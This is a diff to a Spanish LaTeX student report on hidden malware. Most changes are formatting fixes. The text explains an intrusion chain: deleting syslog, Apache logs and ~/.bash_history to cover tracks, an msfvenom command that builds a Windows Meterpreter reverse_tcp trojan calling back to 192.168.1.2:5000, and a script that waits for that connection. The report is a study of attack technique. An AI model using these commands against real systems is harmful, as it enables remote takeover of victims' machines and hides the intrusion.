@@ -26,12 +26,22 @@
     urlcolor = cyan,
 }
 
+\urlstyle{same}
+
+\usepackage{geometry}
+\geometry{
+ a4paper,
+ left = 19mm,
+ right = 19mm,
+ top = 15mm,
+ }
+
 \newcommand{\newpar} {
     \vskip 1cm
 }
 
 \title{Investigación sobre el \texttt{malware} oculto}
-\author{Noelia Díez Pinto, Cristian Camilo Morales Tapias, Ricardo Casanova, Carlos Ortega Marchamalo, Pablo Collado Soto}
+\author{Noelia Díez Pinto \\ Cristian Camilo Morales Tapias \\ Ricardo Casanova \\ Carlos Ortega Marchamalo \\ Pablo Collado Soto}
 \date{}
 
 \begin{document}
@@ -349,7 +359,7 @@
                 En función de nuestro objetivo podemos intentar tratar de mantener este acceso tras la incursión. Para lograrlo deberemos intentar correr nuestra \textit{backdoor} como un servicio o infectar la máquina de alguna otra manera persistente a través de un \textit{rootkit}, por ejemplo. Dado que creemos que no aporta demasiado al tema tratado profundizar en este apartado preferimos mencionarlo y seguir avanzando.
 
             \subsubsection{Eliminación de evidencias}
-                Las acciones que llevamos a cabo se verán reflejadas en el sistema. Es por ello que normalmente queremos tratar de "cubrir nuestras huellas". Para ello deberemos intentar borrar bitácoras o \textit{logs} del sistema como puede ser \texttt{syslog}. Puede que tengamos que eliminar el \textit{log} de servicios como \texttt{Apache}, un servidoor web u otros en función de lo que hayamos hecho. Otro ejemplo de archivo que normalmente querremos destruir es la historia de la \textit{shell} que hayamos empleado como puede ser \texttt{~/.bash_history} en el caso de \texttt{bash}. Existe una lista más exhaustiva a tener en cuenta en \cite{bib:log_files}.
+                Las acciones que llevamos a cabo se verán reflejadas en el sistema. Es por ello que normalmente queremos tratar de "cubrir nuestras huellas". Para ello deberemos intentar borrar bitácoras o \textit{logs} del sistema como puede ser \texttt{syslog}. Puede que tengamos que eliminar el \textit{log} de servicios como \texttt{Apache}, un servidoor web u otros en función de lo que hayamos hecho. Otro ejemplo de archivo que normalmente querremos destruir es la historia de la \textit{shell} que hayamos empleado como puede ser \texttt{~/.bash\_history} en el caso de \texttt{bash}. Existe una lista más exhaustiva a tener en cuenta en \cite{bib:log_files}.
 
             \newpar
 
@@ -412,7 +422,7 @@
                 Con este esquema en mente pasamos a detallar cada una de las partes.
 
             \subsubsection{Generando el \textit{payload}: \texttt{MSFVENOM}}
-                Para facilitar la comprensión de este paso podemos aludir a la formación que hemos adquirido en asignaturas como Sistemas Operativos o Programación en las que estudiamos el proceso que nos lleva desde un archivo fuente \texttt{*.c} a un ejecutable compilado. De manera muy resumida podemos decir que el código fuente pasa por el preprocesador que sustituirá todas las directivas \texttt{#include <>}. A continuación el archivo resultante pasa por el compilador que se encargará de generar archivos objeto \texttt{*.o} para después enlazarlo junto con los demás gracias al enlazador. Tras este último paso llegamos a nuestro ejecutable funcional.
+                Para facilitar la comprensión de este paso podemos aludir a la formación que hemos adquirido en asignaturas como Sistemas Operativos o Programación en las que estudiamos el proceso que nos lleva desde un archivo fuente \texttt{*.c} a un ejecutable compilado. De manera muy resumida podemos decir que el código fuente pasa por el preprocesador que sustituirá todas las directivas \texttt{\#include <>}. A continuación el archivo resultante pasa por el compilador que se encargará de generar archivos objeto \texttt{*.o} para después enlazarlo junto con los demás gracias al enlazador. Tras este último paso llegamos a nuestro ejecutable funcional.
 
                 \newpar
 
@@ -433,14 +443,14 @@
                     \item \texttt{Windows - 32 bits}
                 \end{itemize}
 
-                Con esto en mente debemos alterar la salida que nos ofrece \texttt{MSFVENOM} a través de sus opciones para generer el \textit{payload} deseado. Con el fin de ocultar la complejidad de usar la herramienta directamente hemos escrito un script de bash (la shell por defecto de Kali y otras muchas distribuciones) que se encarga de esto por nosotros. El script en cuestión es \texttt{gen_payload.sh}. No obstante, adjuntamos una invocación de ejemplo de MSFVENOM para comentar qué efecto tiene cada una de sus opciones:
+                Con esto en mente debemos alterar la salida que nos ofrece \texttt{MSFVENOM} a través de sus opciones para generer el \textit{payload} deseado. Con el fin de ocultar la complejidad de usar la herramienta directamente hemos escrito un script de bash (la shell por defecto de Kali y otras muchas distribuciones) que se encarga de esto por nosotros. El script en cuestión es \texttt{gen\_payload.sh}. No obstante, adjuntamos una invocación de ejemplo de MSFVENOM para comentar qué efecto tiene cada una de sus opciones:
 
                 \begin{center}
-                    \texttt{msfvenom -a x64 --platform windows -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.2 LPORT=5000 -f exe -o win_pyld.exe}
+                    \texttt{msfvenom -a x64 --platform windows -p windows/x64/meterpreter/reverse\_tcp LHOST=192.168.1.2 LPORT=5000 -f exe -o win\_pyld.exe}
                 \end{center}
                 
 
-                Con lo anterior estamos generando el \textit{payload} \texttt{win_pyld.exe}. La arquitectura y plataforma de este programa vienen dadas por las opciones \texttt{-a} y \texttt{--platform} respectivamente. Consultando los valores pasados vemos que se trata de una máquina que ejecuta la versión de 64 bits de Windows. Asimismo, el tipo de \textit{payload} seleccionado es \texttt{windows/x64/meterpreter/reverse_tcp}. En la siguiente sección comentaremos el funcionamiento de la misma. Dado el \textit{payload} escogido debemos pasar dos opciones que se introducirán en el código del mismo. En este caso son la IP (\texttt{LHOST}) y el puerto (\texttt{LPORT}) de la máquina atacante. En secciones subsiguientes estudiaremos por qué son necesarias estas opciones. Finalmente especificamos el formato del \textit{payload} generado con la opción \texttt{-f}. Dado que el formato estándar de los archivos ejecutables en Windows. Este archivo generado tendrá, ademas del programa propiamente dicho, las instrucciones necesarias para que el loader de Windows lo cargue correctamente.
+                Con lo anterior estamos generando el \textit{payload} \texttt{win\_pyld.exe}. La arquitectura y plataforma de este programa vienen dadas por las opciones \texttt{-a} y \texttt{--platform} respectivamente. Consultando los valores pasados vemos que se trata de una máquina que ejecuta la versión de 64 bits de Windows. Asimismo, el tipo de \textit{payload} seleccionado es \texttt{windows/x64/meterpreter/reverse\_tcp}. En la siguiente sección comentaremos el funcionamiento de la misma. Dado el \textit{payload} escogido debemos pasar dos opciones que se introducirán en el código del mismo. En este caso son la IP (\texttt{LHOST}) y el puerto (\texttt{LPORT}) de la máquina atacante. En secciones subsiguientes estudiaremos por qué son necesarias estas opciones. Finalmente especificamos el formato del \textit{payload} generado con la opción \texttt{-f}. Dado que el formato estándar de los archivos ejecutables en Windows. Este archivo generado tendrá, ademas del programa propiamente dicho, las instrucciones necesarias para que el loader de Windows lo cargue correctamente.
 
                 \newpar
 
@@ -467,14 +477,14 @@
 
                 \newpar
 
-                Al igual que hicimos con la generación del \textit{payload} hemos automatizado el proceso a través de un script en bash que está enteramente comentado (\texttt{troj_c_n_c.sh}). Tras lanzarlo esperaremos la conexión del \textit{payload} una vez se ejecute y pasaremos a tener automáticamente un indcutor (prompt) esperando órdenes para ejecutar en la víctima.
+                Al igual que hicimos con la generación del \textit{payload} hemos automatizado el proceso a través de un script en bash que está enteramente comentado (\texttt{troj\_c\_n\_c.sh}). Tras lanzarlo esperaremos la conexión del \textit{payload} una vez se ejecute y pasaremos a tener automáticamente un indcutor (prompt) esperando órdenes para ejecutar en la víctima.
 
                 \newpar
 
-                Si bien tenemos shells tradicionales como bash, zsh o ksh en este caso estamos tratando con un entorno totalmente distinto. Si recordamos el nombre del \textit{payload} y nos quemos con la última parte (\texttt{meterpreter/reverse_tcp}) veremos que nuestro \textit{payload} se puede desglosar en dos partes:
+                Si bien tenemos shells tradicionales como bash, zsh o ksh en este caso estamos tratando con un entorno totalmente distinto. Si recordamos el nombre del \textit{payload} y nos quemos con la última parte (\texttt{meterpreter/reverse\_tcp}) veremos que nuestro \textit{payload} se puede desglosar en dos partes:
 
                 \begin{itemize}
-                    \item \textit{Stager}: \texttt{reverse_tcp} -- Se encarga de la conexión de vuelta a la máquina atacante
+                    \item \textit{Stager}: \texttt{reverse\_tcp} -- Se encarga de la conexión de vuelta a la máquina atacante
                     \item \textit{Stage}: \texttt{meterpreter} -- Shell a ejecutar
                 \end{itemize}
 
